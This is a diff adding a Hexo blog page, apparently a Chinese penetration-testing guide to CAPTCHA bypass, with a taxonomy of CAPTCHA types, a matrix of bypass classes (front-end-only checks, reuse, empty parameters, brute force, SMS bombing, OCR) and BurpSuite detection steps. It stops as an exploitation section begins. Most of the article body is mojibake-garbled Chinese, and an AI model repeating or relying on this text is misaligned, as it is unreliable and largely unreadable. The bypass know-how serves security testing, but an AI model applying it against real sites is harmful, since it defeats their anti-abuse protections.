@@ -1,0 +1,1094 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.1.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="楠岃瘉鐮佺粫杩囨紡娲炴妧鏈寚鍗? 鐮旂┒鏃ユ湡锛?026-07-08婕忔礊绫诲瀷锛氶€昏緫婕忔礊 &#x2F; 涓氬姟瀹夊叏椋庨櫓绛夌骇锛氫腑鍗?~ 楂樺嵄锛堝彇鍐充簬鍒╃敤鍦烘櫙锛?&gt; 鏍稿績鍘熷垯锛氶獙璇佺爜鍙槸涓€绉嶅噺缂撴墜娈碉紝涓嶈兘浣滀负鍞竴鐨勫畨鍏ㄩ槻绾?   鐩綍 [涓€銆侀獙璇佺爜姒傝堪涓庡垎绫籡(#涓€楠岃瘉鐮佹杩颁笌鍒嗙被) 浜屻€侀獙璇佺爜婕忔礊鍏ㄦ櫙 [涓">
+<meta property="og:type" content="article">
+<meta property="og:title" content="验证码绕过技术详解">
+<meta property="og:url" content="http://example.com/2026/07/09/%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87/index.html">
+<meta property="og:site_name" content="xiokuの小さな世界">
+<meta property="og:description" content="楠岃瘉鐮佺粫杩囨紡娲炴妧鏈寚鍗? 鐮旂┒鏃ユ湡锛?026-07-08婕忔礊绫诲瀷锛氶€昏緫婕忔礊 &#x2F; 涓氬姟瀹夊叏椋庨櫓绛夌骇锛氫腑鍗?~ 楂樺嵄锛堝彇鍐充簬鍒╃敤鍦烘櫙锛?&gt; 鏍稿績鍘熷垯锛氶獙璇佺爜鍙槸涓€绉嶅噺缂撴墜娈碉紝涓嶈兘浣滀负鍞竴鐨勫畨鍏ㄩ槻绾?   鐩綍 [涓€銆侀獙璇佺爜姒傝堪涓庡垎绫籡(#涓€楠岃瘉鐮佹杩颁笌鍒嗙被) 浜屻€侀獙璇佺爜婕忔礊鍏ㄦ櫙 [涓">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2026-07-09T08:07:15.000Z">
+<meta property="article:modified_time" content="2026-07-09T08:07:16.042Z">
+<meta property="article:author" content="Xioku">
+<meta property="article:tag" content="Web安全">
+<meta property="article:tag" content="绕过">
+<meta property="article:tag" content="验证码">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://example.com/2026/07/09/%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>验证码绕过技术详解 | xiokuの小さな世界</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">xiokuの小さな世界</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">xioku的小破站</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+        <li class="menu-item menu-item-resources">
+
+    <a href="/resources/" rel="section"><i class="download fa-fw"></i>资源</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="Searching..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2026/07/09/%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="Xioku">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="xiokuの小さな世界">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          验证码绕过技术详解
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2026-07-09 16:07:15 / Modified: 16:07:16" itemprop="dateCreated datePublished" datetime="2026-07-09T16:07:15+08:00">2026-07-09</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">Views: </span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="楠岃瘉鐮佺粫杩囨紡娲炴妧鏈寚鍗"><a href="#楠岃瘉鐮佺粫杩囨紡娲炴妧鏈寚鍗" class="headerlink" title="楠岃瘉鐮佺粫杩囨紡娲炴妧鏈寚鍗?"></a>楠岃瘉鐮佺粫杩囨紡娲炴妧鏈寚鍗?</h1><blockquote>
+<p><strong>鐮旂┒鏃ユ湡</strong>锛?026-07-08<br><strong>婕忔礊绫诲瀷</strong>锛氶€昏緫婕忔礊 &#x2F; 涓氬姟瀹夊叏<br><strong>椋庨櫓绛夌骇</strong>锛氫腑鍗?~ 楂樺嵄锛堝彇鍐充簬鍒╃敤鍦烘櫙锛?&gt; <strong>鏍稿績鍘熷垯</strong>锛氶獙璇佺爜鍙槸涓€绉嶅噺缂撴墜娈碉紝涓嶈兘浣滀负鍞竴鐨勫畨鍏ㄩ槻绾?</p>
+</blockquote>
+<hr>
+<h2 id="鐩綍"><a href="#鐩綍" class="headerlink" title="鐩綍"></a>鐩綍</h2><ul>
+<li>[涓€銆侀獙璇佺爜姒傝堪涓庡垎绫籡(#涓€楠岃瘉鐮佹杩颁笌鍒嗙被)</li>
+<li><a href="#%E6%B5%9C%E5%B2%84%E7%8D%99%E7%92%87%E4%BD%BA%E7%88%9C%E5%A9%95%E5%BF%94%E7%A4%8A%E9%8D%8F%E3%84%A6%E6%AB%99">浜屻€侀獙璇佺爜婕忔礊鍏ㄦ櫙</a></li>
+<li>[涓夈€佸墠绔獙璇佺粫杩嘳(#涓夊墠绔獙璇佺粫杩?</li>
+<li><a href="#%E9%8D%A5%E6%B6%A2%E2%82%AC%E6%98%8F%E7%B7%AB%E7%BC%82%E6%B4%AA%E6%AB%A1%E7%BC%81%E6%9B%A1%E7%B9%83">鍥涖€侀€昏緫缂洪櫡缁曡繃</a></li>
+<li><a href="#%E6%B5%9C%E6%94%90cr-%E6%B6%93%E5%BA%A4%E5%9A%9C%E9%8D%94%E3%84%A5%E5%AF%B2%E7%92%87%E5%97%97%E5%9F%86%E7%BC%81%E6%9B%A1%E7%B9%83">浜斻€丱CR 涓庤嚜鍔ㄥ寲璇嗗埆缁曡繃</a></li>
+<li><a href="#%E9%8D%8F%EE%85%A2%E7%8F%AE%E7%BB%BE%D1%87%E7%8D%99%E7%92%87%E4%BD%BA%E7%88%9C%E7%BC%81%E6%9B%A1%E7%B9%83">鍏€侀珮绾ч獙璇佺爜缁曡繃</a></li>
+<li><a href="#%E6%B6%93%E5%86%A8%E4%BC%90%E9%8D%8F%E7%83%BD%E6%91%BC%E6%B6%93%E5%BA%A4%E5%9A%9C%E9%8D%94%E3%84%A5%E5%AF%B2%E9%91%B4%E6%B0%AD%E6%B9%B0">涓冦€佸伐鍏烽摼涓庤嚜鍔ㄥ寲鑴氭湰</a></li>
+<li><a href="#%E9%8D%8F%EE%82%A6%E7%8D%99%E7%92%87%E4%BD%BA%E7%88%9C%E7%80%B9%E5%A4%8A%E5%8F%8F%E7%92%87%E5%8B%AA%E5%8F%8A-checklist">鍏€侀獙璇佺爜瀹夊叏璇勪及 Checklist</a></li>
+<li>[涔濄€侀槻寰″缓璁甝(#涔濋槻寰″缓璁?</li>
+<li>[鍗併€佸弬鑰冮摼鎺(#鍗佸弬鑰冮摼鎺?</li>
+</ul>
+<hr>
+<h2 id="涓€銆侀獙璇佺爜姒傝堪涓庡垎绫"><a href="#涓€銆侀獙璇佺爜姒傝堪涓庡垎绫" class="headerlink" title="涓€銆侀獙璇佺爜姒傝堪涓庡垎绫?"></a>涓€銆侀獙璇佺爜姒傝堪涓庡垎绫?</h2><h3 id="1-1-浠€涔堟槸楠岃瘉鐮"><a href="#1-1-浠€涔堟槸楠岃瘉鐮" class="headerlink" title="1.1 浠€涔堟槸楠岃瘉鐮?"></a>1.1 浠€涔堟槸楠岃瘉鐮?</h3><p>楠岃瘉鐮侊紙CAPTCHA锛欳ompletely Automated Public Turing test to tell Computers and Humans Apart锛夋槸涓€绉嶇敤浜庡尯鍒嗕汉绫荤敤鎴峰拰鑷姩鍖栫▼搴忕殑<strong>鎸戞垬-鍝嶅簲娴嬭瘯</strong>鏈哄埗銆傚叾鏍稿績鐩爣鏄槻姝㈣嚜鍔ㄥ寲鑴氭湰瀵?Web 搴旂敤杩涜鎭舵剰鎿嶄綔锛屽鏆村姏鐮磋В銆佹壒閲忔敞鍐屻€佸瀮鍦句俊鎭彁浜ょ瓑銆?</p>
+<h3 id="1-2-楠岃瘉鐮佸垎绫"><a href="#1-2-楠岃瘉鐮佸垎绫" class="headerlink" title="1.2 楠岃瘉鐮佸垎绫?"></a>1.2 楠岃瘉鐮佸垎绫?</h3><table>
+<thead>
+<tr>
+<th align="left">绫诲埆</th>
+<th align="left">绫诲瀷</th>
+<th align="left">璇存槑</th>
+<th align="center">瀹夊叏寮哄害</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">*<em>鍥惧舰楠岃瘉鐮?</em></td>
+<td align="left">瀛楃鎵洸</td>
+<td align="left">鏁板瓧&#x2F;瀛楁瘝鎵洸鍙樺舰锛屽姞骞叉壈绾?鍣偣</td>
+<td align="center">鈽呪槄鈽?</td>
+</tr>
+<tr>
+<td align="left">*<em>鍥惧舰楠岃瘉鐮?</em></td>
+<td align="left">鏁板杩愮畻</td>
+<td align="left">鏄剧ず绠楀紡锛岃姹傜敤鎴疯绠楃粨鏋?</td>
+<td align="center">鈽呪槅鈽?</td>
+</tr>
+<tr>
+<td align="left">*<em>鍥惧舰楠岃瘉鐮?</em></td>
+<td align="left">鍥剧墖閫夋嫨</td>
+<td align="left">浠庡寮犲浘鐗囦腑閫夋嫨鐗瑰畾鐩爣锛堝浜ら€氱伅锛?</td>
+<td align="center">鈽呪槄鈽?</td>
+</tr>
+<tr>
+<td align="left">*<em>婊戝潡楠岃瘉鐮?</em></td>
+<td align="left">鎷栧姩鎷煎浘</td>
+<td align="left">鎷栧姩婊戝潡灏嗘嫾鍥惧潡瀵归綈鍒扮己鍙ｄ綅缃?</td>
+<td align="center">鈽呪槄鈽呪槄</td>
+</tr>
+<tr>
+<td align="left">*<em>婊戝潡楠岃瘉鐮?</em></td>
+<td align="left">鎷栧姩杞ㄨ抗</td>
+<td align="left">妫€娴嬮紶鏍囨嫋鍔ㄨ建杩规槸鍚︿负浜虹被琛屼负</td>
+<td align="center">鈽呪槄鈽呪槄</td>
+</tr>
+<tr>
+<td align="left">*<em>琛屼负楠岃瘉鐮?</em></td>
+<td align="left">鐐归€夋枃瀛?</td>
+<td align="left">鎸夐『搴忕偣鍑绘枃瀛椾腑鐨勭壒瀹氬瓧绗?</td>
+<td align="center">鈽呪槄鈽呪槄</td>
+</tr>
+<tr>
+<td align="left">*<em>琛屼负楠岃瘉鐮?</em></td>
+<td align="left">鏃嬭浆鍥剧墖</td>
+<td align="left">灏嗗浘鐗囨棆杞嚦姝ｇ‘瑙掑害</td>
+<td align="center">鈽呪槄鈽?</td>
+</tr>
+<tr>
+<td align="left">*<em>鐭俊楠岃瘉鐮?</em></td>
+<td align="left">鏁板瓧 OTP</td>
+<td align="left">鍙戦€佸埌鎵嬫満鐨?4-6 浣嶆暟瀛楅獙璇佺爜</td>
+<td align="center">鈽呪槄鈽呪槄</td>
+</tr>
+<tr>
+<td align="left">*<em>閭楠岃瘉鐮?</em></td>
+<td align="left">閾炬帴&#x2F;鏁板瓧</td>
+<td align="left">閫氳繃閭鍙戦€佺殑楠岃瘉閾炬帴鎴栨暟瀛楃爜</td>
+<td align="center">鈽呪槄鈽?</td>
+</tr>
+<tr>
+<td align="left">*<em>璇煶楠岃瘉鐮?</em></td>
+<td align="left">璇煶鎾姤</td>
+<td align="left">閫氳繃鐢佃瘽璇煶鎾姤楠岃瘉鐮?</td>
+<td align="center">鈽呪槄鈽?</td>
+</tr>
+<tr>
+<td align="left"><strong>reCAPTCHA</strong></td>
+<td align="left">v2&#x2F;v3</td>
+<td align="left">Google 椋庢帶绯荤粺锛寁3 鏃犳劅楠岃瘉</td>
+<td align="center">鈽呪槄鈽呪槄鈽?</td>
+</tr>
+</tbody></table>
+<h3 id="1-3-甯歌楠岃瘉鐮佷骇鍝"><a href="#1-3-甯歌楠岃瘉鐮佷骇鍝" class="headerlink" title="1.3 甯歌楠岃瘉鐮佷骇鍝?"></a>1.3 甯歌楠岃瘉鐮佷骇鍝?</h3><table>
+<thead>
+<tr>
+<th align="left">浜у搧</th>
+<th align="left">绫诲瀷</th>
+<th align="left">鎻愪緵鍟?</th>
+<th align="left">甯歌鍦烘櫙</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">reCAPTCHA v2</td>
+<td align="left">鍥剧墖閫夋嫨 + 澶嶉€夋</td>
+<td align="left">鐧诲綍&#x2F;娉ㄥ唽淇濇姢</td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">reCAPTCHA v3</td>
+<td align="left">鏃犳劅琛屼负璇勫垎</td>
+<td align="left">椋庢帶绯荤粺</td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">鏋侀獙 (Geetest)</td>
+<td align="left">婊戝潡 + 鐐归€?+ 琛屼负</td>
+<td align="left">鍥藉唴涓绘祦</td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">闃块噷浜?Captcha</td>
+<td align="left">婊戝潡 + 鐐归€?+ 鏃嬭浆</td>
+<td align="left">闃块噷浜?</td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">鑵捐浜?Captcha</td>
+<td align="left">婊戝潡 + 鐐归€?+ 涔濆鏍?</td>
+<td align="left">鑵捐浜?</td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">鐧惧害浜?Captcha</td>
+<td align="left">婊戝潡 + 鐐归€?+ 鏃嬭浆</td>
+<td align="left">鐧惧害浜?</td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">椤惰薄 (Dingxiang)</td>
+<td align="left">婊戝潡 + 鐐归€?+ 鏃犳劅</td>
+<td align="left">鍙嶇埇铏?</td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">鑷畾涔夊浘褰㈤獙璇佺爜</td>
+<td align="left">瀛楃鍥惧舰</td>
+<td align="left">鑷爺</td>
+<td align="left">涓皬鍨嬬綉绔?</td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="浜屻€侀獙璇佺爜婕忔礊鍏ㄦ櫙"><a href="#浜屻€侀獙璇佺爜婕忔礊鍏ㄦ櫙" class="headerlink" title="浜屻€侀獙璇佺爜婕忔礊鍏ㄦ櫙"></a>浜屻€侀獙璇佺爜婕忔礊鍏ㄦ櫙</h2><h3 id="2-1-婕忔礊鍒嗙被鐭╅樀"><a href="#2-1-婕忔礊鍒嗙被鐭╅樀" class="headerlink" title="2.1 婕忔礊鍒嗙被鐭╅樀"></a>2.1 婕忔礊鍒嗙被鐭╅樀</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">鈹屸攢鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹?鈹?                   楠岃瘉鐮佺粫杩囨紡娲炲叏鏅?                            鈹?鈹溾攢鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹?鈹?                                                                  鈹?鈹? 涓€銆佸墠绔獙璇佺粫杩?                                                鈹?鈹? 鈹溾攢 1.1 浠呮湁鍓嶇楠岃瘉锛圝S 楠岃瘉锛屽悗绔棤鏍￠獙锛?                      鈹?鈹? 鈹斺攢 1.2 鍓嶇楠岃瘉缁撴灉鍙绡℃敼锛堝搷搴斿寘淇敼锛?                      鈹?鈹?                                                                  鈹?鈹? 浜屻€侀€昏緫缂洪櫡缁曡繃                                                 鈹?鈹? 鈹溾攢 2.1 楠岃瘉鐮佹湭鏍￠獙锛堥殢鎰忚緭鍏ヤ篃鑳介€氳繃锛?                         鈹?鈹? 鈹溾攢 2.2 楠岃瘉鐮佸彲澶嶇敤锛堝悓涓€楠岃瘉鐮佸娆′娇鐢級                        鈹?鈹? 鈹溾攢 2.3 楠岃瘉鐮佺┖鍊肩粫杩囷紙鍒犻櫎楠岃瘉鐮佸弬鏁帮級                          鈹?鈹? 鈹溾攢 2.4 楠岃瘉鐮佹湭缁戝畾浼氳瘽锛堢敤瀹屽嵆寮冿級                              鈹?鈹? 鈹溾攢 2.5 楠岃瘉鐮佹湭缁戝畾鎿嶄綔锛堥獙璇佹垚鍔熷悗淇敼鎿嶄綔瀵硅薄锛?               鈹?鈹? 鈹斺攢 2.6 楠岃瘉鐮佹湁鏁堟湡杩囬暱锛堥暱鏃堕棿鏈夋晥锛?                           鈹?鈹?                                                                  鈹?鈹? 涓夈€佹毚鍔涚牬瑙ｇ粫杩?                                                鈹?鈹? 鈹溾攢 3.1 鐭獙璇佺爜鐖嗙牬锛? 浣嶆暟瀛楀彲鍗曟満鐖嗙牬锛?                       鈹?鈹? 鈹溾攢 3.2 闀块獙璇佺爜澶氱鐖嗙牬锛? 浣嶅苟琛屾敾鍑伙級                          鈹?鈹? 鈹斺攢 3.3 鏃犻鐜囬檺鍒讹紙涓嶉檺鍒跺皾璇曟鏁帮級                              鈹?鈹?                                                                  鈹?鈹? 鍥涖€佽嚜鍔ㄥ寲璇嗗埆缁曡繃                                               鈹?鈹? 鈹溾攢 4.1 OCR 璇嗗埆锛圱esseract / 鑷缁冩ā鍨嬶級                        鈹?鈹? 鈹溾攢 4.2 鏈哄櫒瀛︿範璇嗗埆锛圕NN / ResNet 绛夛級                           鈹?鈹? 鈹斺攢 4.3 鎵撶爜骞冲彴锛?Captcha / 鎵撶爜鍏?/ 瓒呬汉鎵撶爜锛?                 鈹?鈹?                                                                  鈹?鈹? 浜斻€侀珮绾ч獙璇佺爜缁曡繃                                               鈹?鈹? 鈹溾攢 5.1 婊戝潡楠岃瘉鐮佽建杩规ā鎷?                                       鈹?鈹? 鈹溾攢 5.2 鏋侀獙楠岃瘉鐮侀€嗗悜                                            鈹?鈹? 鈹溾攢 5.3 reCAPTCHA 缁曡繃鑷姩鍖栨湇鍔?                                 鈹?鈹? 鈹斺攢 5.4 楠岃瘉鐮?Token 娉勯湶 / 鍥炴樉                                  鈹?鈹?                                                                  鈹?鈹斺攢鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹?```</span><br><span class="line"></span><br><span class="line">### 2.2 婕忔礊鍗卞绛夌骇</span><br><span class="line"></span><br><span class="line">| 婕忔礊绫诲瀷 | 鍗卞绛夌骇 | 鍏稿瀷鍚庢灉 |</span><br><span class="line">|:---------|:--------:|:---------|</span><br><span class="line">| 鍓嶇楠岃瘉缁曡繃 | 馃敶 **楂樺嵄** | 瀹屽叏缁曡繃楠岃瘉鐮侊紝鍙换鎰忚嚜鍔ㄥ寲鎿嶄綔 |</span><br><span class="line">| 楠岃瘉鐮佹湭鏍￠獙 | 馃敶 **楂樺嵄** | 楠岃瘉鐮佸舰鍚岃櫄璁?|</span><br><span class="line">| 楠岃瘉鐮佸彲澶嶇敤 | 馃煛 **涓嵄** | 鍗曟閫氳繃鍚庡彲閲嶅浣跨敤 |</span><br><span class="line">| 楠岃瘉鐮佺┖鍊肩粫杩?| 馃敶 **楂樺嵄** | 鍒犻櫎鍙傛暟鍗冲彲缁曡繃 |</span><br><span class="line">| 楠岃瘉鐮佺垎鐮?| 馃煛 **涓嵄** | 鐭爜鍙垎鐮达紝闀跨爜闅惧害澶?|</span><br><span class="line">| 鐭俊杞扮偢 | 馃敶 **楂樺嵄** | 鏃犻鐜囬檺鍒跺鑷寸煭淇¤祫璐规崯澶?|</span><br><span class="line">| 楠岃瘉鐮佸洖鏄?| 馃煛 **涓嵄** | 鍝嶅簲鍖呬腑娉勯湶楠岃瘉鐮佸師鏂?|</span><br><span class="line">| 楠岃瘉鐮佹湭缁戝畾 | 馃煛 **涓嵄** | 鍙洿鎹㈡搷浣滃璞?|</span><br><span class="line"></span><br><span class="line">---</span><br><span class="line"></span><br><span class="line">## 涓夈€佸墠绔獙璇佺粫杩?</span><br><span class="line">### 3.1 浠呮湁鍓嶇楠岃瘉锛圝S 楠岃瘉锛?</span><br><span class="line">**婕忔礊鍘熺悊**锛氶獙璇佺爜鐨勬牎楠岄€昏緫瀹屽叏鍦ㄦ祻瑙堝櫒绔?JavaScript 涓疄鐜帮紝鍚庣鏈仛浠讳綍楠岃瘉銆傛敾鍑昏€呭彲浠ワ細</span><br><span class="line"></span><br><span class="line">1. **鐩存帴鎶撳寘閲嶆斁** 鈥?缁曡繃鍓嶇 JS 鏍￠獙</span><br><span class="line">2. **绂佺敤娴忚鍣?JS** 鈥?楠岃瘉鐮侀獙璇佷唬鐮佷笉鎵ц</span><br><span class="line">3. **淇敼鍝嶅簲鍖?* 鈥?灏嗛獙璇佸け璐ユ敼涓洪獙璇佹垚鍔?</span><br><span class="line">**妫€娴嬫柟娉?*锛?```bash</span><br><span class="line"># 1. 鏂綉娴嬭瘯</span><br><span class="line"># 鏂紑缃戠粶鍚庯紝楠岃瘉鐮佽緭鍏ラ敊璇粛寮瑰嚭鎻愮ず 鈫?鍓嶇楠岃瘉</span><br><span class="line"></span><br><span class="line"># 2. BurpSuite 鎶撳寘瑙傚療</span><br><span class="line"># 鍙戦€佽姹傛椂锛岄獙璇佺爜鍙傛暟鏈嚭鐜板湪璇锋眰鍖呬腑 鈫?鍓嶇楠岃瘉</span><br><span class="line"></span><br><span class="line"># 3. 绂佺敤 JS 娴嬭瘯</span><br><span class="line"># 鍦ㄦ祻瑙堝櫒涓鐢?JavaScript锛岄獙璇佺爜鍔熻兘澶辨晥 鈫?鍓嶇楠岃瘉</span><br></pre></td></tr></table></figure>
+
+<p><strong>鍒╃敤鏂规硶</strong>锛?&#96;&#96;&#96;http</p>
